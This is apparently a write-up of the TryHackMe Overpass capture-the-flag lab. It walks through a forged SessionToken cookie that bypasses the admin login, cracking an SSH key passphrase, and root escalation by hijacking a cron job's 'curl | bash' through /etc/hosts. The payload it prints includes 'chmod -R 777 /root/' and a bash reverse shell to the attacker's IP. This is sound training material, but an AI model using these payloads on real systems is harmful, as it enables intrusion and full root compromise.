# Overpass

Link: [Overpass](https://tryhackme.com/room/overpass)

## High-Level Overview

Exploit the vulnerable machine to get the `user.txt` and `root.txt` flags. The machine is running a password manager made by a few computer sciences students.

## Tools Needed

* Nmap
* Gobuster
* John the Ripper
* LinPeas

## Walkthrough

Initial scan with `nmap`

```bash
$ sudo nmap -T5 -vvv -sS -A -Pn -oN nmap-scan -p- MACHINE:IP
```

We can see there are two ports open:

* port 22 - running SSH
* port 80 - running HTTP

In the source code of the home page we can see a comment that suggests that the encryption is advertised as military grade, however someone commented to say that's not really the case, while also pointing out that it's something the Romans used.

On the web application, we can see that the source code is also listed for download at `http://MACHINE:IP/downloads/`

Searching for other interesting pages on the web application by enumerating using `gobuster`

```bash
$ gobuster dir -k -u MACHINE:IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

We have found an admin login page:

* `http://MACHINE:IP/admin`

If we inspect the source of this page we can see a `login.js` file that has some vulnerable javascript code inside. The last part of the code is vulnerable:

```js
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
```

The `SessionToken` cookie will be created when the admin credentials are correct.

We can open the browser dev tools using F12 and go to `Storage`. We can then go to the cookies section and select our host `MACHINE:IP`. We can add a new cookie and name it as `SessionToken` and for the path we can rename it to `/`. After doing so and reloading the page we will be logged in as admin.

As the logged in admin, we see that there is a SSH key listed. Apparently it is passphrase protected, but maybe we can have a crack at it.

Making a file `id_rsa` where we paste the private key and then we need to change permissions for it. We will then use the `ssh2john` to convert the private key into a format John the Ripper can crack. Finally, we let John the Ripper try to brute-force the passphrase using the `rockyou.txt` wordlist.

```bash
$ touch id_rsa
$ chmod 600 id_rsa
$ ssh2john id_rsa > id_rsa.hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa
```

We now have the passphrase for the SSH key, which is `james13`.

From the admin login page we also know that this is the SSH key for the user James. With all the SSH login credentials at our disposal, it is time to exploit SSH.

```bash
$ ssh -i id_rsa james@MACHINE:IP
```

We can find the first flag in `james`'s home directory under `user.txt`

Now in order to get the root flag, we need to see how we can escalate privileges.

Seems like the root password might be stored using the overpass password manager

We can use `linpeas.sh` in order to recon. Download linpeas and start a http server where the script is located

```bash
$ chmod +x linpeas.sh
$ python3 -m http.server 8000
```

On the Overpass machine run the following

```bash
$ wget VPN:IP/linpeas.sh
$ chmod +x linpeas.sh
$ ./linpeas.sh
```

We can see there is a cronjob running as root that is trying to download a script from `overpass.thm` using `curl` then run it.

```bash
╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
/usr/bin/crontab
incrontab Not Found
-rw-r--r-- 1 root root     822 Jun 27  2020 /etc/crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

...

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

Additionally, it seems that `james` has permission to write the file `/etc/hosts`

```bash
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/etc/hosts
```

Knowing this we can trick it into downloading a malicious script using the same name, by changing the `/etc/hosts` file.

```bash
$ nano /etc/hosts
# change your VPN:IP to be resolved for the domain overpass.thm
```

Create a folder in your `/` directory in order to mimic the same directory structure as present in the `cronjob`.

```bash
$ cd /
$ sudo mkdir -p downloads/src
$ sudo cd downloads/src
$ sudo touch buildscript.sh
$ sudo chmod +x buildscript.sh
$ sudo nano buildscript.sh
```

Having the file present, now we need to put in a malicious script that will allow us to get root. We can use something like

```bash
chmod -R 777 /root/;
bash -i >& /dev/tcp/VP:IP/1234 0>&1;
# replace VPN:IP and 1234 with your VPN:IP and desired port
```

Start a nc listener on your attacking machine to get the reverse shell.

```bash
$ rlwrap nc -lvnp 1234
```

Start a python3 http server in the folder where the `buildscript.sh` file is located to serve the file to the vulnerable machine

```bash
$ cd /downloads/src
$ sudo sudo python3 -m http.server 80
```

After waiting a few seconds, we should be connected as root and also root is available to all users on the machine. The `root.txt` flag is located in the home directory of `root`.